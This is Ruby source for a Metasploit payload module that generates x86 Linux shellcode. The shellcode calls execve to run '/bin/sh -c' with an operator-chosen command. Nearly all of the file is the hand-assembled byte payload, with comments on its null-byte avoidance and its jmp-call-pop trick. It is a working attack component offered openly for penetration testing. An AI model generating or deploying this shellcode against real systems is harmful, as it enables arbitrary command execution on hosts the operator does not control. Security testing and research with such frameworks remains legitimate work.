##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 47

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => ['vlad902',
                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
      'License'       => BSD_LICENSE,
      'References'    => ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/x86_execve_dyn.asm'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86
    ))

    # Register exec options
    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ])
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage(opts={})
    cmd = datastore['CMD'] || ''
    if cmd.length > 0xffff
        raise RangeError, "CMD length has to be smaller than %d" % 0xffff, caller()
    end
    if cmd.length <= 0xff # 255
      # mov byte bl, cmd.length
      mov_cmd_len_to_reg = "\xb3" + cmd.length.chr
    else
      if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes
        cmd += " "
      end
      # mov word bx, cmd.length
      mov_cmd_len_to_reg = "\x66\xbb" + [cmd.length].pack('v')
    end
    jmp_call = "\xeb" + (25 + mov_cmd_len_to_reg.length).chr
    call_pop = "\xe8" + (0xff - 29 - mov_cmd_len_to_reg.length).chr + "\xff\xff\xff"
    payload  =
      "\x31\xdb"             + # xor ebx, ebx
      "\xf7\xe3"             + # mul ebx
      "\xb0\x0b"             + # mov al, 11 (execve() syscall)
      "\x52"                 + # push edx
      "\x66\x68\x2d\x63"     + # push word 0x632d ("-c")
      "\x89\xe7"             + # mov edi, esp
      jmp_call               + # jmp to call to pop
      "\x5e"                 + # pop esi (address of cmd)
      mov_cmd_len_to_reg     + # mov (byte/word) reg, cmd.length
      "\x88\x14\x1e"         + # mov [esi+ebx], dl
      "\x52"                 + # push edx
      "\x68\x2f\x2f\x73\x68" + # push 0x68732f2f ("//sh")
      "\x68\x2f\x62\x69\x6e" + # push 0x6e69622f ("/bin")
      "\x89\xe3"             + # mov ebx, esp
      "\x52"                 + # push edx
      "\x56"                 + # push esi
      "\x57"                 + # push edi
      "\x53"                 + # push ebx
      "\x89\xe1"             + # mov ecx, esp
      "\xcd\x80"             + # int 0x80
      call_pop               + # call to pop cmd address
      cmd
  end
end
